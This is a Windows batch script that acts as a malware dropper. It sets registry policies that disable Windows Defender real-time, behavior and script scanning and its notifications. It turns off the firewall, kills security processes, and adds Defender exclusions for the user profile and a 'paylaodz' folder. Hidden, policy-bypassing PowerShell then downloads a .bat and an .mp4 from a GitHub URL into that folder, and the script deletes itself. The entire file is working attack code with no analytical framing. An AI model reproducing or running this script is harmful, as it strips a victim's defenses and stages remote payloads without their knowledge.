@echo off
setlocal EnableDelayedExpansion

set "POL=HKLM\Software\Policies\Microsoft\Windows Defender"
set "SC=HKLM\Software\Policies\Microsoft\Windows Defender Security Center"
set "RT=HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"
set "AS=HKLM\Software\Policies\Microsoft\Windows Defender\Spynet"
set "MP=HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine"
set "NX=HKLM\Software\Policies\Microsoft\Windows Defender\NIS"
set "EX=HKLM\Software\Policies\Microsoft\Windows Defender\Exclusions"
set "UX=HKLM\Software\Microsoft\Windows Defender"
set "DOCS=%USERPROFILE%\Documents"
set "USERDIR=%USERPROFILE%"
set "DL=%USERPROFILE%\Documents\paylaodz"
set "URL_BAT=https://raw.githubusercontent.com/tienkhah1/WassupLinkDinVoi/main/Ja9nz39.bat"
set "URL_MP4=https://raw.githubusercontent.com/tienkhah1/WassupLinkDinVoi/main/202611012226.mp4"

:: realtime off
reg add "%POL%" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "%POL%" /v "DisableAntiVirus" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "%POL%" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "%POL%" /v "DisableSpecialRunningMpsruns" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "%POL%" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "%POL%" /v "SubmitSamplesConsent" /t REG_DWORD /d 2 /f >nul 2>&1
reg add "%POL%" /v "PUAProtection" /t REG_DWORD /d 0 /f >nul 2>&1

reg add "%RT%" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "%RT%" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "%RT%" /v "DisableOnAccessProtection" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "%RT%" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "%RT%" /v "DisableIOAVProtection" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "%RT%" /v "DisableScriptScanning" /t REG_DWORD /d 1 /f >nul 2>&1

:: notifications / security center
reg add "%SC%\Notifications" /v "DisableNotifications" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "%SC%\Notifications" /v "DisableEnhancedNotifications" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "%SC%\Notifications" /v "DisableAntiSpywareNotifications" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "%SC%\Notifications" /v "DisableAntiVirusNotifications" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "%SC%\Notifications" /v "DisableRealtimeMonitoringNotifications" /t REG_DWORD /d 1 /f >nul 2>&1

:: cloud / engine
reg add "%AS%" /v "SpynetReporting" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "%AS%" /v "SubmitSamplesConsent" /t REG_DWORD /d 2 /f >nul 2>&1
reg add "%MP%" /v "MpEnablePus" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "%NX%" /v "DisableProtocolRecognition" /t REG_DWORD /d 1 /f >nul 2>&1

:: ux
reg add "%UX%" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "%UX%" /v "DisableAntiVirus" /t REG_DWORD /d 1 /f >nul 2>&1

:: firewall off
netsh advfirewall set allprofiles state off >nul 2>&1

:: bounce defender UI
taskkill /f /im MSASCuiL.exe >nul 2>&1
taskkill /f /im SecurityHealthSystray.exe >nul 2>&1
taskkill /f /im SecurityHealthService.exe >nul 2>&1

:: bounce explorer
taskkill /f /im explorer.exe >nul 2>&1
start "" explorer.exe

:: exclusions — docs + userprofile + download dir, policy keys
reg add "%EX%\Paths" /v "%DOCS%" /t REG_SZ /d "" /f >nul 2>&1
reg add "%EX%\Paths" /v "%DOCS%\*" /t REG_SZ /d "" /f >nul 2>&1
reg add "%EX%\Paths" /v "%USERDIR%" /t REG_SZ /d "" /f >nul 2>&1
reg add "%EX%\Paths" /v "%USERDIR%\*" /t REG_SZ /d "" /f >nul 2>&1
reg add "%EX%\Paths" /v "%DL%" /t REG_SZ /d "" /f >nul 2>&1
reg add "%EX%\Paths" /v "%DL%\*" /t REG_SZ /d "" /f >nul 2>&1

:: exclusions — the ones that actually matter (MpPreference)
powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
  "try { Add-MpPreference -ExclusionPath '%DOCS%' -ErrorAction SilentlyContinue } catch {}; ^
   try { Add-MpPreference -ExclusionPath '%DOCS%\*' -ErrorAction SilentlyContinue } catch {}; ^
   try { Add-MpPreference -ExclusionPath '%USERDIR%' -ErrorAction SilentlyContinue } catch {}; ^
   try { Add-MpPreference -ExclusionPath '%USERDIR%\*' -ErrorAction SilentlyContinue } catch {}; ^
   try { Add-MpPreference -ExclusionPath '%DL%' -ErrorAction SilentlyContinue } catch {}; ^
   try { Add-MpPreference -ExclusionPath '%DL%\*' -ErrorAction SilentlyContinue } catch {}"

:: download into the excluded user profile dir
if not exist "%DL%" mkdir "%DL%" >nul 2>&1

echo [1/2] pulling bat...
powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
  "try { Invoke-WebRequest -Uri '%URL_BAT%' -OutFile '%DL%\Ja9nz39.bat' -UseBasicParsing } catch { exit 1 }"

echo [2/2] pulling mp4...
powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
  "try { Invoke-WebRequest -Uri '%URL_MP4%' -OutFile '%DL%\202611012226.mp4' -UseBasicParsing } catch { exit 1 }"

:: self delete
(goto) 2>nul & del "%~f0"
